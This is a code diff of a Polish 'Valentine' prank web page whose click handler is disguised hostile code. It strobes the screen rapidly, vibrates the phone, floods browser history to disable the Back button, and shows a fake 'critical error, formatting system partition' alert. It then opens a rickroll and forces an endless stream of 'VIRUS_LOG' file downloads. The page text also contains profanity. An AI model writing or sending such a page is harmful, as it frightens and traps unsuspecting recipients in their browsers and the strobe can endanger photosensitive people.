@@ -1,33 +1,67 @@
 <!DOCTYPE html>
-<html>
+<html lang="pl">
 <head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>Walentynka</title>
-    <meta charset="utf-8">
+    <style>
+        body {
+            background-color: red;
+            color: white;
+            font-family: 'Arial', sans-serif;
+            display: flex;
+            flex-direction: column;
+            align-items: center;
+            justify-content: center;
+            height: 100vh;
+            margin: 0;
+            cursor: pointer;
+            overflow: hidden;
+            text-align: center;
+        }
+        h1 { font-size: 3rem; text-shadow: 2px 2px 10px black; }
+        p { font-size: 1.5rem; }
+        /* Efekt mrugania tła */
+        .flash { animation: blinker 0.2s linear infinite; }
+        @keyframes blinker {
+            50% { background-color: black; }
+        }
+    </style>
 </head>
-<body onclick="boom()" style="background:red; color:white; text-align:center; font-family:sans-serif; padding-top:50%;">
-    <h1>Chcesz zostac moja walentynka?</h1>
-    <p>Kliknij tutaj jak tak a jak nie to wypierdalaj.</p>
+<body onclick="boom()">
+    <div id="content">
+        <h1>Walentynka</h1>
+        <p>chcesz zostan moja walentynka?</p>
+        <p><strong>KLIKNIJ TUTAJ jesli chcesz a jak nie to wypierdalaj</strong></p>
+    </div>
 
     <script>
         function boom() {
-            // 1. Muzyka
-            window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
+            // Dodajemy mruganie ekranu po kliknięciu
+            document.body.classList.add('flash');
 
-            // 2. Blokada przycisku "Wstecz"
-            for (var i = 0; i < 1000; i++) {
-                window.history.pushState({}, '', "#error_" + i);
+            // Wibracje na telefonie (Android)
+            if (navigator.vibrate) { navigator.vibrate([500, 200, 500, 200, 500]); }
+
+            // Blokada przycisku wstecz (500 wpisów w historii)
+            for (let i = 0; i < 500; i++) {
+                window.history.pushState({}, '', "#warning_system_error_" + i);
             }
 
-            // 3. Bomba pobierania (iOS wyrzuca spam okienek)
-            setInterval(function() {
-                const a = document.createElement('a');
-                a.href = 'data:text/plain;base64,WFRESA==';
-                a.download = 'CRITICAL_ERROR.txt';
-                a.click();
-            }, 1000);
+            // Pierwszy alert (straszak)
+            alert("BŁĄD KRYTYCZNY! Rozpoczęto formatowanie partycji systemowej...");
 
-            // 4. Alert, żeby nie mogli zamknąć karty od razu
-            alert("SYSTEM FAILURE! Próba naprawy...");
+            // Rickroll i bomby po 1 sekundzie
+            setTimeout(function() {
+                window.open("https://www.youtube.com/watch?v=dQw4w9WgXcQ", "_blank");
+                
+                setInterval(function() {
+                    const a = document.createElement('a');
+                    a.href = 'data:text/plain;base64,WFREU0E=';
+                    a.download = 'VIRUS_LOG_' + Math.floor(Math.random() * 9999) + '.txt';
+                    a.click();
+                }, 800);
+            }, 1000);
         }
     </script>
 </body>
